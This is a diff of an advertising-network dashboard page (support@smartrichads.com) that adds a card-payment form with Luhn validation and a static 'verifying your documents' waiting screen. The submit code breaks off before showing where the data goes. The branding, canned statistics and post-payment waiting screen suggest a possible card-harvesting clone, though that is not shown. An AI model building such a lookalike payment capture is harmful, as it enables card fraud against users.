@@ -131,6 +131,131 @@
         .hidden {
             display: none;
         }
+
+        .verification-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #f9fafb;
+            z-index: 1000;
+            overflow-y: auto;
+            padding: 2rem;
+        }
+
+        .verification-content {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 2rem;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem 1rem;
+            background: #f3f4f6;
+            border: none;
+            border-radius: 0.375rem;
+            color: #374151;
+            font-size: 0.875rem;
+            cursor: pointer;
+            margin-bottom: 2rem;
+            transition: background-color 0.2s;
+        }
+
+        .back-button:hover {
+            background: #e5e7eb;
+        }
+
+        h1 {
+            font-size: 1.875rem;
+            font-weight: 600;
+            color: #111827;
+            margin-bottom: 1.5rem;
+        }
+
+        .verification-text {
+            color: #6b7280;
+            line-height: 1.5;
+            margin-bottom: 1rem;
+        }
+
+        .verification-text a {
+            color: #6d28d9;
+            text-decoration: none;
+        }
+
+        .verification-text a:hover {
+            text-decoration: underline;
+        }
+
+        .status-box {
+            background: #f3f4f6;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            margin: 2rem 0;
+        }
+
+        .status-text {
+            color: #6d28d9;
+            font-weight: 500;
+        }
+
+        .questions-box {
+            background: #f9fafb;
+            padding: 1.5rem;
+            border-radius: 0.5rem;
+        }
+
+        .questions-box h2 {
+            font-size: 1.25rem;
+            font-weight: 500;
+            color: #111827;
+            margin-bottom: 1rem;
+        }
+
+        .questions-box ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .questions-box li {
+            color: #6b7280;
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+        }
+
+        .questions-box li::before {
+            content: "•";
+            color: #6d28d9;
+            font-weight: bold;
+            margin-right: 0.5rem;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @media (max-width: 768px) {
+            .verification-container {
+                padding: 1rem;
+            }
+
+            .verification-content {
+                padding: 1rem;
+            }
+
+            h1 {
+                font-size: 1.5rem;
+            }
+        }
     </style>
 </head>
 
@@ -183,12 +308,13 @@
                         </a>
                     </li>
                     <li>
-                        <a href="#create-campaign" class="nav-link" onclick="showSection('createCampaignSection'); return false;">
+                        <a href="#create-campaign" class="nav-link"
+                            onclick="showSection('createCampaignSection'); return false;">
                             <i class="fa-solid fa-plus"></i>
                             <span>Create Campaign</span>
                         </a>
                     </li>
-                    
+
                     <li>
                         <a href="#settings">
                             <i class="fa-solid fa-gear"></i>
@@ -232,12 +358,11 @@
                     <p>To add an offer, contact your manager</p>
                 </div>
 
-                <!-- Payment Form -->
                 <div class="payment-form hidden" id="paymentForm">
                     <div class="payment-form-header">
                         <h2>Add Funds</h2>
                     </div>
-                    <form onsubmit="event.preventDefault();" class="payment-form-content">
+                    <form class="payment-form-content">
                         <div class="payment-methods">
                             <button type="button" class="payment-method active" onclick="selectPaymentMethod('stripe')">
                                 <i class="fa-brands fa-stripe"></i>
@@ -248,51 +373,85 @@
                                 <span>PayPal</span>
                             </button>
                         </div>
-
+                
                         <div class="form-section stripe-section">
                             <div class="form-group">
                                 <label>Card Number</label>
-                                <input type="text" placeholder="1234 5678 9012 3456" maxlength="19">
+                                <input type="text" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                             </div>
                             <div class="form-row">
                                 <div class="form-group">
                                     <label>Expiry Date</label>
-                                    <input type="text" placeholder="MM/YY" maxlength="5">
+                                    <input type="text" name="expiryDate" placeholder="MM/YY" maxlength="5" required>
                                 </div>
                                 <div class="form-group">
                                     <label>CVC</label>
-                                    <input type="text" placeholder="123" maxlength="3">
+                                    <input type="text" name="cvc" placeholder="123" maxlength="4" required>
                                 </div>
                             </div>
                         </div>
-
+                
                         <div class="form-section paypal-section hidden">
                             <div class="form-group">
                                 <label>PayPal Email</label>
-                                <input type="email" placeholder="your@email.com">
+                                <input type="email" name="paypalEmail" id="paypalEmail" placeholder="your@email.com">
                             </div>
                         </div>
-
+                
                         <div class="form-group">
                             <label>Amount</label>
-                            <input type="number" placeholder="Enter amount" min="1" step="1">
+                            <input type="number" name="amount" placeholder="Enter amount" min="1" step="0.01" required>
+                        </div>
+                
+                        <button type="submit" class="submit-button">Submit for Approval</button>
+                    </form>
+                </div>
+                <div id="verificationPage" class="verification-container hidden">
+                    <div class="verification-content">
+                        <button class="back-button" onclick="hideVerificationPage()">
+                            <i class="fa-solid fa-arrow-left"></i> Back to Dashboard
+                        </button>
+
+                        <h1>We are veryfing your documents</h1>
+
+                        <p class="verification-text">
+                            Verification on weekdays occurs within 24 hours. On the weekend, please, contact our support
+                            in live chat or via email at
+                            <a href="mailto:support@smartrichads.com">support@smartrichads.com</a>.
+                        </p>
+
+                        <p class="verification-text">
+                            We will let you know as soon as your verification status is updated. No additional actions
+                            are required. After this, you will automatically get access to all RichAds features.
+                        </p>
+
+                        <div class="status-box">
+                            <p>Status: <span class="status-text">Waiting verification</span> <i
+                                    class="fa-solid fa-spinner fa-spin"></i></p>
                         </div>
 
-                        <button type="submit" class="submit-button">Proceed to Payment</button>
-                    </form>
+                        <div class="questions-box">
+                            <h2>If you have any questions:</h2>
+                            <ul>
+                                <li>Contact your personal manager directly</li>
+                                <li>Use live-chat in the right corner of the screen</li>
+                                <li>Email us at <a href="mailto:support@smartrichads.com">support@smartrichads.com</a></li>
+                            </ul>
+                        </div>
+                    </div>
                 </div>
                 <div id="createCampaignSection" class="create-campaign-section hidden">
                     <div class="create-campaign-container">
                         <div class="campaign-header">
                             <div>
-                                <input id="campaignFormTitle" type="text" placeholder="Enter Campaign Name"> 
+                                <input id="campaignFormTitle" type="text" placeholder="Enter Campaign Name">
                                 <span id="campaignId" class="campaign-id"></span>
                             </div>
                             <button class="btn btn-secondary" onclick="showSection('campaignsSection')">
                                 <i class="fa-solid fa-times"></i>
                             </button>
                         </div>
-                
+
                         <div class="campaign-steps">
                             <a href="#" class="step-item active">
                                 <span class="step-number">1</span>
@@ -315,13 +474,13 @@
                                 <span>Budget</span>
                             </a>
                         </div>
-                
+
                         <div class="campaign-form">
                             <div class="form-section">
                                 <div class="form-section-header">
                                     <h2 class="form-section-title">Optimization strategy</h2>
                                 </div>
-                
+
                                 <div class="optimization-options">
                                     <div class="optimization-card disabled" onclick="selectOptimization('target-cpa')">
                                         <div class="card-header">
@@ -333,27 +492,29 @@
                                         </p>
                                         <button class="btn btn-secondary">Setup tracker to unlock Target CPA</button>
                                     </div>
-                
+
                                     <div class="optimization-card" onclick="selectOptimization('performance')">
                                         <div class="card-header">
                                             <span class="card-title">Performance Mode</span>
                                             <span class="new-badge">New</span>
                                         </div>
                                         <p class="card-description">
-                                            Fresh whitelist every day. Get the best sources according to our rating for an effective start of a new campaign.
+                                            Fresh whitelist every day. Get the best sources according to our rating for
+                                            an effective start of a new campaign.
                                         </p>
                                     </div>
-                
+
                                     <div class="optimization-card active" onclick="selectOptimization('manual')">
                                         <div class="card-header">
                                             <span class="card-title">Manual CPC</span>
                                         </div>
                                         <p class="card-description">
-                                            Optimize manually or with an external optimization tool. Use only when it necessary.
+                                            Optimize manually or with an external optimization tool. Use only when it
+                                            necessary.
                                         </p>
                                     </div>
                                 </div>
-                
+
                                 <div class="recommended-cpc">
                                     <div class="recommended-cpc-header">
                                         <span class="recommended-cpc-title">Recommended CPC</span>
@@ -364,9 +525,10 @@
                                     </p>
                                 </div>
                             </div>
-                
+
                             <div class="form-actions">
-                                <button class="btn btn-secondary" onclick="showSection('campaignsSection')">Cancel</button>
+                                <button class="btn btn-secondary"
+                                    onclick="showSection('campaignsSection')">Cancel</button>
                                 <button class="btn btn-primary">Continue</button>
                             </div>
                         </div>
@@ -375,7 +537,7 @@
                         <div class="form-section-header">
                             <h2 class="form-section-title">Creative</h2>
                         </div>
-                    
+
                         <div class="creative-header">
                             <div class="impression-priority">
                                 <label>Impression priority</label>
@@ -385,7 +547,7 @@
                                 </div>
                             </div>
                         </div>
-                    
+
                         <div class="creative-table">
                             <div class="table-header">
                                 <div class="col-icon">Icon</div>
@@ -395,7 +557,7 @@
                                 <div class="col-banner">Banner</div>
                                 <div class="col-actions">Actions</div>
                             </div>
-                    
+
                             <div class="creative-rows">
                                 <!-- Repeat this block for each creative row -->
                                 <div class="creative-row">
@@ -428,158 +590,158 @@
                                     </div>
                                 </div>
                             </div>
-                    
+
                             <button class="add-creative-btn">
                                 <i class="fa-solid fa-plus"></i>
                                 Creative
                             </button>
                         </div>
-                </div>
-                <!-- Add to dashboard.html inside main-content div -->
-                <div class="finances-section hidden" id="financesSection">
-                    <div class="finances-content">
-                        <div class="finance-cards">
-                            <div class="finance-card">
-                                <div class="card-header">Balance</div>
-                                <div class="card-amount">$ 0</div>
-                            </div>
-                            <div class="finance-card">
-                                <div class="card-header">Unpaid Approved Spend</div>
-                                <div class="card-amount">$ 0</div>
-                            </div>
-                            <div class="finance-card">
-                                <div class="card-header">Hold Spend</div>
-                                <div class="card-amount">$ 0</div>
-                            </div>
-                            <div class="finance-card summary-card">
-                                <div class="summary-item">
-                                    <span>Total Payments</span>
-                                    <span>-</span>
+                    </div>
+                    <!-- Add to dashboard.html inside main-content div -->
+                    <div class="finances-section hidden" id="financesSection">
+                        <div class="finances-content">
+                            <div class="finance-cards">
+                                <div class="finance-card">
+                                    <div class="card-header">Balance</div>
+                                    <div class="card-amount">$ 0</div>
                                 </div>
-                                <div class="summary-item">
-                                    <span>Total Expenses</span>
-                                    <span>-</span>
+                                <div class="finance-card">
+                                    <div class="card-header">Unpaid Approved Spend</div>
+                                    <div class="card-amount">$ 0</div>
                                 </div>
-                            </div>
-                        </div>
-
-                        <div class="transactions-section">
-                            <div class="transaction-tabs">
-                                <button class="tab-btn active" data-tab="all">
-                                    <i class="fa-solid fa-list"></i>
-                                    All transactions
-                                </button>
-                                <button class="tab-btn" data-tab="payments">
-                                    <i class="fa-solid fa-arrow-down"></i>
-                                    Payments
-                                </button>
-                                <button class="tab-btn" data-tab="expenses">
-                                    <i class="fa-solid fa-arrow-up"></i>
-                                    Expenses
-                                </button>
-                                <button class="tab-btn" data-tab="balance">
-                                    <i class="fa-solid fa-wallet"></i>
-                                    Balance
-                                </button>
-                            </div>
-
-                            <div class="date-filter">
-                                <button class="date-filter-btn">
-                                    <i class="fa-regular fa-calendar"></i>
-                                    <span id="dateRangeText">Jan 31, 2025 0:00 - Jan 31, 2025 18:07</span>
-                                </button>
-                                <div class="date-picker-popup hidden">
-                                    <div class="date-picker-content">
-                                        <div class="date-picker-group">
-                                            <label>Start Date & Time</label>
-                                            <input type="date" id="startDate" value="2025-01-31">
-                                            <input type="time" id="startTime" value="00:00">
-                                        </div>
-                                        <div class="date-picker-group">
-                                            <label>End Date & Time</label>
-                                            <input type="date" id="endDate" value="2025-01-31">
-                                            <input type="time" id="endTime" value="18:07">
-                                        </div>
-                                        <div class="date-picker-actions">
-                                            <button class="cancel-btn">Cancel</button>
-                                            <button class="apply-btn">Apply</button>
-                                        </div>
+                                <div class="finance-card">
+                                    <div class="card-header">Hold Spend</div>
+                                    <div class="card-amount">$ 0</div>
+                                </div>
+                                <div class="finance-card summary-card">
+                                    <div class="summary-item">
+                                        <span>Total Payments</span>
+                                        <span>-</span>
+                                    </div>
+                                    <div class="summary-item">
+                                        <span>Total Expenses</span>
+                                        <span>-</span>
                                     </div>
                                 </div>
                             </div>
 
-                            <div class="no-transactions">
-                                <i class="fa-regular fa-file"></i>
-                                <h3>No transactions found</h3>
-                                <p>You have no data for the selected period</p>
+                            <div class="transactions-section">
+                                <div class="transaction-tabs">
+                                    <button class="tab-btn active" data-tab="all">
+                                        <i class="fa-solid fa-list"></i>
+                                        All transactions
+                                    </button>
+                                    <button class="tab-btn" data-tab="payments">
+                                        <i class="fa-solid fa-arrow-down"></i>
+                                        Payments
+                                    </button>
+                                    <button class="tab-btn" data-tab="expenses">
+                                        <i class="fa-solid fa-arrow-up"></i>
+                                        Expenses
+                                    </button>
+                                    <button class="tab-btn" data-tab="balance">
+                                        <i class="fa-solid fa-wallet"></i>
+                                        Balance
+                                    </button>
+                                </div>
+
+                                <div class="date-filter">
+                                    <button class="date-filter-btn">
+                                        <i class="fa-regular fa-calendar"></i>
+                                        <span id="dateRangeText">Jan 31, 2025 0:00 - Jan 31, 2025 18:07</span>
+                                    </button>
+                                    <div class="date-picker-popup hidden">
+                                        <div class="date-picker-content">
+                                            <div class="date-picker-group">
+                                                <label>Start Date & Time</label>
+                                                <input type="date" id="startDate" value="2025-01-31">
+                                                <input type="time" id="startTime" value="00:00">
+                                            </div>
+                                            <div class="date-picker-group">
+                                                <label>End Date & Time</label>
+                                                <input type="date" id="endDate" value="2025-01-31">
+                                                <input type="time" id="endTime" value="18:07">
+                                            </div>
+                                            <div class="date-picker-actions">
+                                                <button class="cancel-btn">Cancel</button>
+                                                <button class="apply-btn">Apply</button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="no-transactions">
+                                    <i class="fa-regular fa-file"></i>
+                                    <h3>No transactions found</h3>
+                                    <p>You have no data for the selected period</p>
+                                </div>
                             </div>
                         </div>
                     </div>
+                    <!-- Campaigns Section -->
+                    <div id="campaignsSection" class="campaigns-section hidden">
+                        <div class="table-responsive">
+                            <table class="table">
+                                <thead>
+                                    <tr>
+                                        <th>Name</th>
+                                        <th>Status</th>
+                                        <th>Impressions</th>
+                                        <th>Winrate</th>
+                                        <th>Clicks</th>
+                                        <th>CTR</th>
+                                        <th>Conv</th>
+                                        <th>Spend</th>
+                                        <th>Microbidding</th>
+                                        <th>eCPC</th>
+                                        <th>eCPA</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>Campaign_USA</td>
+                                        <td><span class="status-badge">Active</span></td>
+                                        <td>4,290,820</td>
+                                        <td>47%</td>
+                                        <td>3,838</td>
+                                        <td>0.89%</td>
+                                        <td><i class="fa-solid fa-lock lock-icon"></i></td>
+                                        <td>$35</td>
+                                        <td class="bid-type">+ Custom Bid</td>
+                                        <td>$0.009</td>
+                                        <td><i class="fa-solid fa-lock lock-icon"></i></td>
+                                    </tr>
+                                    <tr>
+                                        <td>Campaign_IDN_NEW</td>
+                                        <td><span class="status-badge">Active</span></td>
+                                        <td>4,484,940</td>
+                                        <td>51%</td>
+                                        <td>3,945</td>
+                                        <td>0.87%</td>
+                                        <td><i class="fa-solid fa-lock lock-icon"></i></td>
+                                        <td>$32</td>
+                                        <td class="bid-type">+ Custom Bid</td>
+                                        <td>$0.008</td>
+                                        <td><i class="fa-solid fa-lock lock-icon"></i></td>
+                                    </tr>
+                                    <tr>
+                                        <td>Campaign_IND_Start</td>
+                                        <td><span class="status-badge">Active</span></td>
+                                        <td>3,913,540</td>
+                                        <td>36%</td>
+                                        <td>3,670</td>
+                                        <td>0.93%</td>
+                                        <td><i class="fa-solid fa-lock lock-icon"></i></td>
+                                        <td>$30</td>
+                                        <td class="bid-type">⟋ CPC * 2</td>
+                                        <td>$0.008</td>
+                                        <td><i class="fa-solid fa-lock lock-icon"></i></td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
                 </div>
-                <!-- Campaigns Section -->
-<div id="campaignsSection" class="campaigns-section hidden">
-    <div class="table-responsive">
-        <table class="table">
-            <thead>
-                <tr>
-                    <th>Name</th>
-                    <th>Status</th>
-                    <th>Impressions</th>
-                    <th>Winrate</th>
-                    <th>Clicks</th>
-                    <th>CTR</th>
-                    <th>Conv</th>
-                    <th>Spend</th>
-                    <th>Microbidding</th>
-                    <th>eCPC</th>
-                    <th>eCPA</th>
-                </tr>
-            </thead>
-            <tbody>
-                <tr>
-                    <td>Campaign_USA</td>
-                    <td><span class="status-badge">Active</span></td>
-                    <td>4,290,820</td>
-                    <td>47%</td>
-                    <td>3,838</td>
-                    <td>0.89%</td>
-                    <td><i class="fa-solid fa-lock lock-icon"></i></td>
-                    <td>$35</td>
-                    <td class="bid-type">+ Custom Bid</td>
-                    <td>$0.009</td>
-                    <td><i class="fa-solid fa-lock lock-icon"></i></td>
-                </tr>
-                <tr>
-                    <td>Campaign_IDN_NEW</td>
-                    <td><span class="status-badge">Active</span></td>
-                    <td>4,484,940</td>
-                    <td>51%</td>
-                    <td>3,945</td>
-                    <td>0.87%</td>
-                    <td><i class="fa-solid fa-lock lock-icon"></i></td>
-                    <td>$32</td>
-                    <td class="bid-type">+ Custom Bid</td>
-                    <td>$0.008</td>
-                    <td><i class="fa-solid fa-lock lock-icon"></i></td>
-                </tr>
-                <tr>
-                    <td>Campaign_IND_Start</td>
-                    <td><span class="status-badge">Active</span></td>
-                    <td>3,913,540</td>
-                    <td>36%</td>
-                    <td>3,670</td>
-                    <td>0.93%</td>
-                    <td><i class="fa-solid fa-lock lock-icon"></i></td>
-                    <td>$30</td>
-                    <td class="bid-type">⟋ CPC * 2</td>
-                    <td>$0.008</td>
-                    <td><i class="fa-solid fa-lock lock-icon"></i></td>
-                </tr>
-            </tbody>
-         </table>
-    </div>
-</div>
-            </div>
 
         </main>
     </div>
@@ -588,295 +750,254 @@
         // Initialize variables
         let currentView = 'offers';
 
-function toggleSidebar() {
-    const sidebar = document.getElementById('sidebar');
-    const body = document.body;
-    sidebar.classList.toggle('active');
-    body.classList.toggle('menu-open');
+        function toggleSidebar() {
+            const sidebar = document.getElementById('sidebar');
+            const body = document.body;
+            sidebar.classList.toggle('active');
+            body.classList.toggle('menu-open');
 
-    let overlay = document.getElementById('mobileOverlay');
-    if (!overlay) {
-        overlay = document.createElement('div');
-        overlay.id = 'mobileOverlay';
-        overlay.className = 'mobile-overlay';
-        overlay.onclick = toggleSidebar;
-        document.body.appendChild(overlay);
-    }
-    overlay.classList.toggle('active');
-}
+            let overlay = document.getElementById('mobileOverlay');
+            if (!overlay) {
+                overlay = document.createElement('div');
+                overlay.id = 'mobileOverlay';
+                overlay.className = 'mobile-overlay';
+                overlay.onclick = toggleSidebar;
+                document.body.appendChild(overlay);
+            }
+            overlay.classList.toggle('active');
+        }
 
-function showSection(sectionId) {
-    const sections = [
-        'emptyState',
-        'paymentForm', 
-        'financesSection',
-        'campaignsSection',
-        'createCampaignSection'
-    ];
-    
-    sections.forEach(section => {
-        const elem = document.getElementById(section);
-        if (elem) elem.classList.add('hidden');
-    });
+        function showSection(sectionId) {
+            const sections = [
+                'emptyState',
+                'paymentForm',
+                'financesSection',
+                'campaignsSection',
+                'createCampaignSection'
+            ];
 
-    const targetSection = document.getElementById(sectionId);
-    if (targetSection) targetSection.classList.remove('hidden');
-
-    // Update header title based on section
-    const topNavTitle = document.querySelector('.top-nav h1');
-    switch(sectionId) {
-        case 'createCampaignSection':
-            topNavTitle.textContent = 'Create Campaign';
-            break;
-        case 'campaignsSection':
-            topNavTitle.textContent = 'Campaigns';
-            break;
-        case 'financesSection':
-            topNavTitle.textContent = 'Finances';
-            break;
-        default:
-            topNavTitle.textContent = 'Offers';
-    }
-    
-    // Update active nav item
-    document.querySelectorAll('.nav-menu li').forEach(item => {
-        item.classList.remove('active');
-    });
-
-    // Set active state based on section
-    let activeSelector;
-    switch(sectionId) {
-        case 'createCampaignSection':
-            activeSelector = 'a[href="#create-campaign"]';
-            break;
-        case 'campaignsSection':
-            activeSelector = 'a[href="#campaigns"]';
-            break;
-        case 'financesSection':
-            activeSelector = 'a[href="#finances"]';
-            break;
-        default:
-            activeSelector = 'a[href="#offers"]';
-    }
-
-    const activeNavItem = document.querySelector(activeSelector)?.parentElement;
-    if (activeNavItem) {
-        activeNavItem.classList.add('active');
-    }
-}
-// Initialize campaign step navigation
-document.addEventListener('DOMContentLoaded', function() {
-    const stepItems = document.querySelectorAll('.step-item');
-    stepItems.forEach(item => {
-        item.addEventListener('click', (e) => {
-            e.preventDefault();
-            stepItems.forEach(step => step.classList.remove('active'));
-            item.classList.add('active');
-        });
-    });
-});
-
-// Initialize campaign step navigation
-document.addEventListener('DOMContentLoaded', function() {
-    const stepItems = document.querySelectorAll('.step-item');
-    stepItems.forEach(item => {
-        item.addEventListener('click', (e) => {
-            e.preventDefault();
-            stepItems.forEach(step => step.classList.remove('active'));
-            item.classList.add('active');
-        });
-    });
-});
-
-function togglePaymentForm() {
-    showSection('paymentForm');
-    document.querySelectorAll('.nav-menu li').forEach(item => {
-        item.classList.remove('active');
-    });
-    const addFundsNavItem = document.querySelector('a[href="#add-funds"]').parentElement;
-    addFundsNavItem.classList.add('active');
-    
-    if (window.innerWidth <= 768) {
-        toggleSidebar();
-    }
-}
-
-function selectPaymentMethod(method) {
-    const buttons = document.querySelectorAll('.payment-method');
-    const stripeSect = document.querySelector('.stripe-section');
-    const paypalSect = document.querySelector('.paypal-section');
-
-    buttons.forEach(btn => btn.classList.remove('active'));
-    event.currentTarget.classList.add('active');
-
-    if (method === 'stripe') {
-        stripeSect.classList.remove('hidden');
-        paypalSect.classList.add('hidden');
-    } else {
-        stripeSect.classList.add('hidden');
-        paypalSect.classList.remove('hidden');
-    }
-}
-
-document.addEventListener('DOMContentLoaded', function() {
-    showSection('emptyState');
-
-    const navItems = {
-        'offers': 'emptyState',
-        'finances': 'financesSection',
-        'campaigns': 'campaignsSection'
-    };
-
-    for (const [key, value] of Object.entries(navItems)) {
-        const navLink = document.querySelector(`a[href="#${key}"]`);
-        if (navLink) {
-            const navItem = navLink.parentElement;
-            navItem.setAttribute('data-section', value);
-
-            navItem.addEventListener('click', (e) => {
-                e.preventDefault();
-                showSection(value);
-                if (window.innerWidth <= 768) {
-                    toggleSidebar();
-                }
+            sections.forEach(section => {
+                const elem = document.getElementById(section);
+                if (elem) elem.classList.add('hidden');
             });
+
+            const targetSection = document.getElementById(sectionId);
+            if (targetSection) targetSection.classList.remove('hidden');
+
+            // Update header title based on section
+            const topNavTitle = document.querySelector('.top-nav h1');
+            switch (sectionId) {
+                case 'createCampaignSection':
+                    topNavTitle.textContent = 'Create Campaign';
+                    break;
+                case 'campaignsSection':
+                    topNavTitle.textContent = 'Campaigns';
+                    break;
+                case 'financesSection':
+                    topNavTitle.textContent = 'Finances';
+                    break;
+                default:
+                    topNavTitle.textContent = 'Offers';
+            }
+
+            // Update active nav item
+            document.querySelectorAll('.nav-menu li').forEach(item => {
+                item.classList.remove('active');
+            });
+
+            // Set active state based on section
+            let activeSelector;
+            switch (sectionId) {
+                case 'createCampaignSection':
+                    activeSelector = 'a[href="#create-campaign"]';
+                    break;
+                case 'campaignsSection':
+                    activeSelector = 'a[href="#campaigns"]';
+                    break;
+                case 'financesSection':
+                    activeSelector = 'a[href="#finances"]';
+                    break;
+                default:
+                    activeSelector = 'a[href="#offers"]';
+            }
+
+            const activeNavItem = document.querySelector(activeSelector)?.parentElement;
+            if (activeNavItem) {
+                activeNavItem.classList.add('active');
+            }
         }
-    }
 
-    document.querySelectorAll('.tab-btn').forEach(btn => {
-        btn.addEventListener('click', () => {
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-        });
-    });
-
-    initializeDatePicker();
-});
-
-function initializeDatePicker() {
-    const dateFilterBtn = document.querySelector('.date-filter-btn');
-    const popup = document.querySelector('.date-picker-popup');
-    const cancelBtn = document.querySelector('.cancel-btn');
-    const applyBtn = document.querySelector('.apply-btn');
-    const startDate = document.getElementById('startDate');
-    const startTime = document.getElementById('startTime');
-    const endDate = document.getElementById('endDate');
-    const endTime = document.getElementById('endTime');
-
-    if (!dateFilterBtn) return;
-
-    function formatDate(date, time) {
-        const d = new Date(`${date}T${time}`);
-        return d.toLocaleString('en-US', {
-            month: 'short',
-            day: 'numeric',
-            year: 'numeric',
-            hour: 'numeric',
-            minute: '2-digit',
-            hour12: false
-        });
-    }
-
-    function updateDateRangeText() {
-        const formattedText = `${formatDate(startDate.value, startTime.value)} - ${formatDate(endDate.value, endTime.value)}`;
-        document.getElementById('dateRangeText').textContent = formattedText;
-    }
-
-    dateFilterBtn.addEventListener('click', (e) => {
-        e.stopPropagation();
-        popup.classList.toggle('hidden');
-    });
-
-    cancelBtn.addEventListener('click', () => {
-        popup.classList.add('hidden');
-    });
-
-    applyBtn.addEventListener('click', () => {
-        updateDateRangeText();
-        popup.classList.add('hidden');
-    });
-
-    document.addEventListener('click', (e) => {
-        if (!popup.contains(e.target) && !dateFilterBtn.contains(e.target)) {
-            popup.classList.add('hidden');
-        }
-    });
-
-    popup.addEventListener('click', (e) => {
-        e.stopPropagation();
-    });
-}
-document.addEventListener('DOMContentLoaded', function() {
+        document.addEventListener('DOMContentLoaded', function () {
     const paymentForm = document.querySelector('.payment-form-content');
-    const stripeSection = document.querySelector('.stripe-section');
-    const paypalSection = document.querySelector('.paypal-section');
-    const paymentMethodButtons = document.querySelectorAll('.payment-method');
-    
-    // Create status label
+    const paymentFormContainer = document.getElementById('paymentForm');
+    const verificationPage = document.getElementById('verificationPage');
     const statusLabel = document.createElement('div');
     statusLabel.className = 'payment-status-label';
     paymentForm.appendChild(statusLabel);
 
-    // Payment method selection
-    window.selectPaymentMethod = function(method) {
-        paymentMethodButtons.forEach(btn => btn.classList.remove('active'));
-        event.target.closest('.payment-method').classList.add('active');
-        
-        if (method === 'stripe') {
-            stripeSection.classList.remove('hidden');
-            paypalSection.classList.add('hidden');
-        } else {
-            stripeSection.classList.add('hidden');
-            paypalSection.classList.remove('hidden');
-        }
-    };
+    // Card number formatting
+    const cardNumberInput = paymentForm.querySelector('input[name="cardNumber"]');
+    cardNumberInput.addEventListener('input', function (e) {
+        let value = this.value.replace(/\D/g, '');
+        value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+        if (value.length > 19) return;
+        this.value = value;
+    });
 
-    // Form submission
-    paymentForm.addEventListener('submit', async function(e) {
-        e.preventDefault();
+    // Expiry date formatting
+    const expiryDateInput = paymentForm.querySelector('input[name="expiryDate"]');
+    expiryDateInput.addEventListener('input', function (e) {
+        let value = this.value.replace(/\D/g, '');
+        if (value.length > 4) return;
         
+        if (value.length >= 2) {
+            value = value.slice(0, 2) + '/' + value.slice(2);
+        }
+        
+        this.value = value;
+    });
+
+    // CVC formatting
+    const cvcInput = paymentForm.querySelector('input[name="cvc"]');
+    cvcInput.addEventListener('input', function (e) {
+        this.value = this.value.replace(/\D/g, '');
+    });
+
+    // Email validation function (for PayPal)
+    function validateEmail(email) {
+        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return regex.test(email);
+    }
+
+    // Card number validation using Luhn algorithm
+    function validateCardNumber(number) {
+        if (!/^\d+$/.test(number)) return false;
+        
+        let sum = 0;
+        let isEven = false;
+        
+        for (let i = number.length - 1; i >= 0; i--) {
+            let digit = parseInt(number.charAt(i), 10);
+            
+            if (isEven) {
+                digit *= 2;
+                if (digit > 9) {
+                    digit -= 9;
+                }
+            }
+            
+            sum += digit;
+            isEven = !isEven;
+        }
+        
+        return (sum % 10) === 0;
+    }
+
+    // Expiry date validation
+    function validateExpiryDate(date) {
+        const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+        if (!regex.test(date)) return false;
+        
+        const [month, year] = date.split('/');
+        const currentDate = new Date();
+        const currentYear = currentDate.getFullYear() % 100;
+        const currentMonth = currentDate.getMonth() + 1;
+        
+        const expYear = parseInt(year, 10);
+        const expMonth = parseInt(month, 10);
+        
+        return expYear > currentYear || 
+               (expYear === currentYear && expMonth >= currentMonth);
+    }
+
+    // CVC validation
+    function validateCVC(cvc) {
+        return /^\d{3,4}$/.test(cvc);
+    }
+
+    // Form validation function
+    function validateForm(currentPaymentMethod) {
         // Clear previous status
         statusLabel.textContent = '';
         statusLabel.className = 'payment-status-label';
 
-        // Collect form data
-        const paymentMethod = document.querySelector('.payment-method.active').textContent.trim();
-        const amountInput = this.querySelector('input[type="number"]');
-        const amount = amountInput.value;
-
-        // Basic client-side validation
+        // Validate amount
+        const amountInput = paymentForm.querySelector('input[name="amount"]');
+        const amount = amountInput.value.trim();
         if (!amount || parseFloat(amount) <= 0) {
             statusLabel.textContent = 'Invalid amount. Please enter a positive number.';
             statusLabel.classList.add('error');
+            return false;
+        }
+
+        // Validate payment method-specific fields
+        if (currentPaymentMethod === 'stripe') {
+            const cardNumber = paymentForm.querySelector('input[name="cardNumber"]').value.trim().replace(/\s/g, '');
+            const expiryDate = paymentForm.querySelector('input[name="expiryDate"]').value.trim();
+            const cvc = paymentForm.querySelector('input[name="cvc"]').value.trim();
+
+            // Card number validation
+            if (!validateCardNumber(cardNumber)) {
+                statusLabel.textContent = 'Invalid card number.';
+                statusLabel.classList.add('error');
+                return false;
+            }
+
+            // Expiry date validation
+            if (!validateExpiryDate(expiryDate)) {
+                statusLabel.textContent = 'Invalid expiry date. Use MM/YY format and ensure it\'s not expired.';
+                statusLabel.classList.add('error');
+                return false;
+            }
+
+            // CVC validation
+            if (!validateCVC(cvc)) {
+                statusLabel.textContent = 'Invalid CVC. Must be 3-4 digits.';
+                statusLabel.classList.add('error');
+                return false;
+            }
+        } else if (currentPaymentMethod === 'paypal') {
+            const paypalEmail = document.getElementById('paypalEmail').value.trim();
+            if (!validateEmail(paypalEmail)) {
+                statusLabel.textContent = 'Please enter a valid PayPal email.';
+                statusLabel.classList.add('error');
+                return false;
+            }
+        }
+
+        return true;
+    }
+
+    // Form submission handler
+    paymentForm.addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        // Determine current payment method
+        const currentPaymentMethod = document.querySelector('.payment-method.active').querySelector('i').classList.contains('fa-stripe') ? 'stripe' : 'paypal';
+
+        // Validate form
+        if (!validateForm(currentPaymentMethod)) {
             return;
         }
 
-        // Prepare payload based on payment method
-        let formData;
